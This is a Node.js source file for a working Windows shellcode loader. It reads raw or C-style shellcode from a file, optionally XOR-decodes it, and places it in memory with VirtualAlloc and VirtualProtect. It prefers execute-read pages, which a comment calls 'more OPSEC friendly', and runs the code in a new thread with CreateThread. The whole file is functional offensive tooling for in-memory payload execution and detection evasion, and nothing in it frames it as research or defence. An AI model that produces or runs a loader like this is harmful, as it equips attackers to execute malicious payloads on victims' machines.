
const fs = require('fs').promises;
const path = require('path');
const koffi = require('koffi');

async function main() {
  const args = process.argv.slice(2);

  if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
    console.log(`
Usage: node ${path.basename(process.argv[1])} <file> [options]

Options:
  --xor-key <number>     XOR decode shellcode with 1-byte key (0–255)
  --wait <ms>            WaitForSingleObject timeout (default: infinite, 0 = non-blocking)
  --help                 Show this help
    `);
    process.exit(0);
  }

  let filePath = args[0];
  let xorKey = null;
  let waitMs = 0xFFFFFFFF; // INFINITE

  // ── Parse options ────────────────────────────────────────
  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--xor-key' || arg === '-k') {
      xorKey = parseInt(args[++i], 0);
      if (isNaN(xorKey) || xorKey < 0 || xorKey > 255) {
        throw new Error(`Invalid --xor-key value (must be 0–255)`);
      }
    } else if (arg === '--wait') {
      waitMs = parseInt(args[++i], 10);
      if (isNaN(waitMs) || waitMs < 0) {
        throw new Error(`Invalid --wait value (must be >= 0)`);
      }
    }
  }

  console.log(`[+] Loading: ${filePath}`);

  // ── Read file ────────────────────────────────────────────
  let raw;
  try {
    raw = await fs.readFile(filePath);
  } catch (err) {
    throw new Error(`Cannot read file ${filePath}: ${err.message}`);
  }

  let shellcode;

  // ── Format detection & parsing ───────────────────────────
  const ext = path.extname(filePath).toLowerCase();

  if (['.bin', '.raw', '.sc'].includes(ext)) {
    // Treat as raw binary
    shellcode = raw;
    console.log(`[+] Detected raw binary (.bin) – ${shellcode.length} bytes`);
  } else {
    // Assume C-style header (\xAA\xBB...)
    const text = raw.toString('utf8');
    const matches = [...text.matchAll(/\\x([0-9a-f]{2})/gi)];
    
    if (matches.length === 0) {
      throw new Error(
        'No \\xNN patterns found. If this is raw shellcode, use .bin extension.'
      );
    }

    const bytes = matches.map(m => parseInt(m[1], 16));
    shellcode = Buffer.from(bytes);
    console.log(`[+] Parsed ${shellcode.length} bytes from C-style header`);
  }

  if (shellcode.length === 0) {
    throw new Error('Shellcode is empty');
  }

  // ── Optional XOR decoding ────────────────────────────────
  if (xorKey !== null) {
    console.log(`[+] Applying XOR key 0x${xorKey.toString(16).padStart(2,'0')}`);
    for (let i = 0; i < shellcode.length; i++) {
      shellcode[i] ^= xorKey;
    }
  }

  // ── Windows API via koffi ────────────────────────────────
  const kernel32 = koffi.load('kernel32.dll');

  const VirtualAlloc = kernel32.func(
    'void * __stdcall VirtualAlloc(void * lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect)'
  );

  const VirtualProtect = kernel32.func(
    'bool __stdcall VirtualProtect(void * lpAddress, size_t dwSize, uint32_t flNewProtect, uint32_t * lpflOldProtect)'
  );

  const RtlCopyMemory = kernel32.func(
    'void __stdcall RtlCopyMemory(void * Destination, const void * Source, size_t Length)'
  );

  const CreateThread = kernel32.func(
    'void * __stdcall CreateThread(void * lpThreadAttributes, size_t dwStackSize, void * lpStartAddress, void * lpParameter, uint32_t dwCreationFlags, uint32_t * lpThreadId)'
  );

  const WaitForSingleObject = kernel32.func(
    'uint32_t __stdcall WaitForSingleObject(void * hHandle, uint32_t dwMilliseconds)'
  );

  const constants = {
    MEM_COMMIT              : 0x1000,
    MEM_RESERVE             : 0x2000,
    PAGE_READWRITE          : 0x04,
    PAGE_EXECUTE_READ       : 0x20,
    PAGE_EXECUTE_READWRITE  : 0x40,
    INFINITE                : 0xFFFFFFFF,
  };

  // ── Allocate & copy ──────────────────────────────────────
  const addr = VirtualAlloc(null, shellcode.length, constants.MEM_COMMIT | constants.MEM_RESERVE, constants.PAGE_READWRITE);
  if (!addr) throw new Error(`VirtualAlloc failed (GetLastError: ${koffi.win32.GetLastError?.() ?? '?'})`);

  console.log(`[+] Allocated RW memory @ ${addr.toString(16)}`);

  RtlCopyMemory(addr, shellcode, shellcode.length);
  console.log('[+] Shellcode copied');

  // ── Try RX first (more OPSEC friendly), fallback to RWX ─
  const oldProtect = Buffer.alloc(4);
  let success = VirtualProtect(addr, shellcode.length, constants.PAGE_EXECUTE_READ, oldProtect);

  if (!success) {
    console.warn('[-] RX protection failed → falling back to RWX');
    success = VirtualProtect(addr, shellcode.length, constants.PAGE_EXECUTE_READWRITE, oldProtect);
    if (!success) throw new Error('VirtualProtect failed');
    console.log('[+] Using RWX memory');
  } else {
    console.log('[+] Using RX memory');
  }

  // ── Execute ──────────────────────────────────────────────
  console.log('[+] Creating thread...');
  const threadIdBuf = Buffer.alloc(4);
  const thread = CreateThread(null, 0, addr, null, 0, threadIdBuf);

  if (!thread) throw new Error('CreateThread failed');

  const tid = threadIdBuf.readUInt32LE(0);
  console.log(`[+] Thread started (TID: ${tid})`);

  if (waitMs === 0) {
    console.log('[i] Non-blocking mode (--wait 0) – exiting now');
    process.exit(0);
  }

  console.log(`[+] Waiting for thread to finish (timeout: ${waitMs === constants.INFINITE ? '∞' : waitMs + ' ms'}) ...`);
  const result = WaitForSingleObject(thread, waitMs);

  if (result === 0) {
    console.log('[✓] Thread completed successfully');
  } else if (result === 0x102) { // WAIT_TIMEOUT
    console.log('[!] Thread still running (timeout reached)');
  } else {
    console.warn(`[!] WaitForSingleObject returned ${result}`);
  }
}

main().catch(err => {
  console.error(`Error: ${err.message}`);
  process.exit(1);
});
